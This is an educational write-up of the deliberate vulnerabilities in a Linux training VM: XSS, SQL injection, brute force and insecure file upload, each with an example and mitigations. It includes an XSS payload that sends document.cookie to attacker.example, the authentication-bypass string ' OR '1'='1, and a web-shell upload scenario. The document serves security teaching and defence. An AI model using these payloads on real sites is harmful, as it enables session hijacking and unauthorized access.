# Linux VM Vulnerabilities

This document highlights the deliberate vulnerabilities included in the Linux target VM. Each vulnerability is presented with a clear description, educational purpose, real-world relevance, and an example demonstrating the practical impact.

---

## Cross-Site Scripting (XSS)

**Description:**
**Cross-Site Scripting (XSS)** occurs when an application includes untrusted user input in pages sent to other users without proper validation or output encoding. Attackers inject client-side code (usually **JavaScript**) that the victim’s browser executes in the context of the site. Because the code runs in users’ browsers, XSS can steal session tokens, perform actions on behalf of users, show spoofed UI, or be chained with other vulnerabilities to increase impact.

**Educational Purpose:**
Students will exploit stored, reflected, and DOM-based XSS in controlled exercises to learn how payloads execute in victims’ browsers, how data (cookies, `localStorage`, form values) can be exfiltrated, and how to defend against these attacks. Exercises emphasise **output encoding**, **input validation**, **CSP**, cookie flags, and secure client-side scripting patterns.

**Real-World Relevance:**
XSS is a persistent and common web vulnerability (historically in the OWASP Top 10). Although it primarily targets site users rather than the server itself, successful XSS attacks lead to **account takeover**, credential theft, phishing at scale, and automated worms that propagate across social platforms. Understanding XSS is essential for securing any web application that accepts user content.

**Example:**
A comment field accepts and renders HTML without encoding. An attacker posts the following payload:

```html
<script>fetch('[https://attacker.example/steal?c='+encodeURIComponent(document.cookie](https://attacker.example/steal?c='+encodeURIComponent(document.cookie)))</script>
```
When other users view the comment, their browsers execute the script and send session cookies to the attacker, enabling account hijacking or unauthorized actions using the victim’s session.

**Mitigations (brief):**

* Output-encode all untrusted data according to context (HTML, attribute, JS, URL).
* Use templating engines that auto-escape and avoid direct `innerHTML`/`document.write`.
* Implement a strict Content Security Policy (CSP) and enable `HttpOnly`/`Secure` on cookies.
* Validate and normalise input, and whitelist acceptable content (e.g., HTML sanitiser for allowed tags).
* Test with automated scanners and manual DOM inspection.

---

## SQL Injection

**Description:**
SQL Injection happens when untrusted input is interpolated into database queries, allowing attackers to alter the query logic and read, modify, or delete data. This includes classic inline SQL concatenation as well as malformed parameters that change control flow.

**Educational Purpose:**
Students will craft injection strings to enumerate databases, bypass authentication, and extract sensitive tables. Labs teach defensive coding: **prepared statements**, ORM parameterisation, input validation, least privilege database accounts, and proper error handling to avoid information leakage.

**Real-World Relevance:**
SQL injection remains one of the most damaging web vulnerabilities because it directly targets **data stores**. Successful exploits have led to large breaches, theft of personal and financial data, and **full system compromise** when combined with escalated privileges. Knowing both offensive and defensive aspects is critical for secure development and auditing.

**Example:**
A login field is concatenated into a SQL query:

```sql
SELECT * FROM users WHERE username = 'posted_username' AND password = 'posted_password';
```
An attacker submits `posted_username = ' OR '1'='1` to force the `WHERE` clause true and bypass authentication, or uses `UNION` queries to dump table contents.

**Mitigations (brief):**

* Use parameterised queries / prepared statements or ORM with safe binding.
* Restrict DB user privileges to the minimum required.
* Avoid detailed SQL error messages in production.
* Employ input validation and length/type checks.
* Apply database activity monitoring and regular code reviews.

---

## Brute Force Attack

**Description:**
Brute force attacks systematically try many password combinations, dictionary words, or credential permutations to gain unauthorized access. They can be targeted (single account) or broad (**credential stuffing** across many accounts using leaked credentials).

**Educational Purpose:**
Students will perform controlled credential guessing against intentionally weak accounts to observe attack patterns and the effectiveness of mitigations such as **rate-limiting**, **account lockouts**, and **multi-factor authentication (MFA)**. The exercises also cover monitoring and alerting practices.

**Real-World Relevance:**
Weak, reused, or default credentials are a top cause of initial compromise. Credential stuffing (using lists of breached username/password pairs) and automated SSH/FTP sweeps lead to ransomware, data exfiltration, and **lateral movement** when attackers succeed. Enterprises must harden authentication and detect anomalous login behaviour.

**Example:**
An attacker uses an automated tool to try thousands of common passwords against an SSH service. If an account uses `password123`, the attacker can gain shell access and then escalate from there.

**Mitigations (brief):**

* Enforce strong password policies and MFA.
* Implement rate-limiting, exponential backoff, and temporary lockouts.
* Disable or rename default accounts and remove unused services.
* Use IP blocking/geo-restrictions and monitor failed login spikes.
* Implement credential hygiene and encourage password managers.

---

## File Upload Vulnerability

**Description:**
Insecure file upload mechanisms allow attackers to upload executable or otherwise harmful files to a server. Problems include trusting MIME types, allowing dangerous extensions, insufficient content scanning, or storing uploads inside the web root.

**Educational Purpose:**
Students will test upload handlers, attempt to upload **web shells**, and observe how server configuration and validation steps prevent or allow **remote code execution**. Labs highlight secure storage, content inspection, and policy enforcement.

**Real-World Relevance:**
Many compromises begin with an uploaded web shell or malicious artefact. CMS platforms and bespoke apps that allow media or plugin uploads have been used to plant **backdoors**, distribute malware, or pivot across networks. Defending upload surfaces is a practical necessity for web security.

**Example:**
An attacker uploads `shell.php` to an image upload endpoint that incorrectly validates only the filename. They then access `https://site/uploads/shell.php` to run arbitrary commands on the server and obtain a persistent foothold.

**Mitigations (brief):**

* Enforce strict extension and MIME type whitelists and validate file contents (magic bytes).
* Rename and store uploads outside the web root; serve via a proxy if needed.
* Limit file sizes and scan uploads with antivirus/AV engines.
* Apply least privilege to storage accounts and avoid executing uploaded files.
* Log and monitor upload activity; require authentication for sensitive upload endpoints.

---

## Key Takeaways

* Always validate and sanitise user inputs according to expected context — server-side is authoritative.
* Use context-aware output encoding (HTML, attribute, JS, URL) and safe templating.
* Prefer parameterised queries / prepared statements and least-privilege DB users.
* Enforce strong authentication, rate-limiting, and MFA; monitor for credential abuse.
* Restrict upload types, verify file contents, store uploads safely, and scan for malware.
* Implement security headers (CSP, X-Content-Type-Options), use `HttpOnly`/`Secure` cookies, and enable robust logging and alerting.
* Regularly test with both automated scanners and manual review — think like an attacker to build better defences.
